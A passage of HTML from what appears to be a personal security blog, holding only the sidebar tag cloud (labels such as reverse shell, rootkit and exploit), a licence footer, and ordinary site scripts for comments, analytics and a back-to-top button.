    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ad.html">ad</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/announcement.html">announcement</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/antivirus.html">antivirus</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/anyconnect.html">anyconnect</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/apache.html">apache</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/arch.html">arch</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/assembly.html">assembly</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/asu.html">asu</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/backdoor.html">backdoor</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/baidu.html">baidu</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/blackhat.html">blackhat</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/bridge.html">bridge</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/buffer-overflow.html">buffer overflow</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/c.html">C#</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/career.html">career</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/censorship.html">censorship</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/cisco.html">cisco</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/code-maintainance.html">code maintainance</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/compton.html">compton</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/conhost.html">conhost</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/conpty.html">conpty</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/coursera.html">Coursera</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/credential-harvesting.html">credential harvesting</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/crypto.html">crypto</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/cryptography.html">cryptography</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/cve.html">CVE</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/cve-2018-18955.html">CVE-2018-18955</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/cve-2018-7750.html">CVE-2018-7750</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/diary.html">diary</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/dnswu-ran.html">DNS污染</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/dpi.html">DPI</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/email.html">email</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/emp3r0r.html">emp3r0r</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/exploit.html">exploit</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/file-transfer.html">file transfer</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/gdb.html">gdb</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/gfw.html">gfw</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ghidra.html">ghidra</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/github.html">github</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/glowing-bear.html">Glowing Bear</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/golang.html">golang</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/gpu.html">gpu</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/great-wall.html">great wall</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/greatwall.html">greatwall</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/hacking.html">hacking</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/hacking-tool.html">hacking tool</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/hiwifi.html">HiWiFi</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/http2.html">HTTP2</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/https.html">https</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/injection.html">injection</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/irc.html">IRC</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/ji-lu-you.html">极路由</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/kcp.html">KCP</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/kcptun.html">kcptun</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/kernel.html">kernel</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/killer.html">killer</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/lede.html">lede</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/libvirt.html">libvirt</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/life.html">life</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/linux.html">linux</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/linux-kernel.html">linux kernel</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/lkm.html">lkm</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/log-cleaner.html">log cleaner</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/lpe.html">LPE</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/macos.html">macos</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/mass-exploit.html">mass exploit</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/mec.html">mec</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/memory-layout.html">memory layout</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/mentohust.html">mentohust</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/misc.html">Misc</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/mouse.html">mouse</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/multi-threaded-crawler.html">multi-threaded crawler</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/namespace.html">namespace</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/natural-scroll.html">natural scroll</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/netcat.html">netcat</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/network.html">network</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/nic.html">nic</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/obfs4.html">obfs4</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/obfsproxy.html">obfsproxy</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/ocserv.html">ocserv</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/openwrt.html">openwrt</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/paramiko.html">paramiko</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/pentest.html">pentest</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/pep8.html">pep8</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/pgp.html">PGP</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/pi.html">pi</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/port-forwarding.html">port-forwarding</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/post-exploitation.html">post-exploitation</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/privilege-escalation.html">privilege escalation</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/programming.html">programming</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/project.html">project</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/proxy.html">proxy</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ptrace.html">ptrace</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ptrace_traceme.html">PTRACE_TRACEME</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/python.html">python</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/pythonic.html">pythonic</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/qemu.html">qemu</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/qq.html">QQ</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/quote.html">quote</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/rce.html">RCE</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/reverse-shell.html">reverse shell</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/reversing.html">reversing</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/rootkit.html">rootkit</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/s2-045.html">s2-045</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/scanner.html">scanner</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/scramblesuit.html">scramblesuit</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/secure-boot.html">secure boot</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/seed-lab.html">SEED lab</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/sfu.html">sfu</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/shadowsocks.html">shadowsocks</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/shadowsocks-plus.html">shadowsocks-plus</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/shell.html">shell</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/shellcode.html">shellcode</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/socket.html">socket</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/ss.html">SS</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/ssh.html">ssh</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/ssh-harvester.html">ssh-harvester</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/sshd.html">sshd</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ssl.html">SSL</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/stanford.html">Stanford</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/sudo.html">sudo</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/switch.html">switch</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/systemd.html">systemd</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/terminal.html">terminal</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/thomas-jefferson.html">Thomas Jefferson</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/tmux.html">TMUX</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/tools.html">tools</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/trasparent-proxy.html">trasparent proxy</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/vim.html">vim</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/virtualbox.html">virtualbox</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/virtualization.html">virtualization</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/vpn.html">vpn</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/wayland.html">wayland</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/web.html">web</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/weechat.html">weechat</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/windows.html">windows</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/windows-domain.html">windows domain</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/windows-server.html">windows server</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xfce4.html">xfce4</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xfwm.html">xfwm</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xhost.html">xhost</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xml.html">xml</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/zoomeye.html">zoomeye</a>
    </li>
  </ul>
</li>
<!-- End Sidebar/Tag Cloud -->
    </ul>
</section>
<!-- End Sidebar -->                </aside>
            </div>
        </div>
    </div>
    <!-- End Content Container -->

<footer>
    <div class="container">
        <hr />
        <div class="row">
                <div class="col-xs-10">
                &copy; 2024 jm33-ng -
                <a href="/pages/about.html" target="_blank" title="about this site">
                    About this site</a>                <p>
                    <small><a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.en"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-nc/4.0/80x15.png" /></a>
Content
licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.en">Creative Commons Attribution-NonCommercial 4.0 International License</a>, except where indicated otherwise.
</small>
                </p>
                <p>
                    <small>Images hosted on this site are either my own or from the Internet</small>
                </p>
            </div>
        </div>
    </div>
</footer>
    <script src="https://jm33.me/theme/js/jquery.min.js"></script>

    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://jm33.me/theme/js/bootstrap.min.js"></script>

    <!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
    <script src="https://jm33.me/theme/js/respond.min.js"></script>


    <script src="https://jm33.me/theme/js/bodypadding.js"></script>
<!-- Disqus -->
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'jm33-m0'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var s = document.createElement('script');
        s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<!-- End Disqus Code -->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-83DRXDJQYG"></script>
<script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', 'G-83DRXDJQYG');
</script>



    <!-- custom part  -->

    <!-- asciinema js -->
    <script src="https://jm33.me/theme/js/asciinema-player.js" async></script>

    <!-- back-to-top starts -->
    <style>
        #topBtn {
            display: none;
            position: fixed;
            bottom: 20px;
            right: 30px;
            z-index: 99;
            border: none;
            outline: none;
            background-color: rgba(62, 63, 58, 0.9);
            color: white;
            cursor: pointer;
            padding: 10px;
            border-radius: 200px;
            font-size: 40px;
            line-height: 40px;
        }

        #topBtn:hover {
            background-color: #3e3f3a;
        }
    </style>

    <button onclick="topFunction()" id="topBtn" title="Go to top"><i class="fa fa-arrow-up" aria-hidden="true"></i></button>

    <script>
        // When the user scrolls down 20px from the top of the document, show the button
        window.onscroll = function() {
            scrollFunction()
        };

        function scrollFunction() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                document.getElementById("topBtn").style.display = "block";

            } else {
                document.getElementById("topBtn").style.display = "none";

            }

        }

        // When the user clicks on the button, scroll to the top of the document
        function topFunction() {
            document.body.scrollTop = 0;
            document.documentElement.scrollTop = 0;

        }
    </script>
    <!-- back-to-top ends-->

</body>

</html>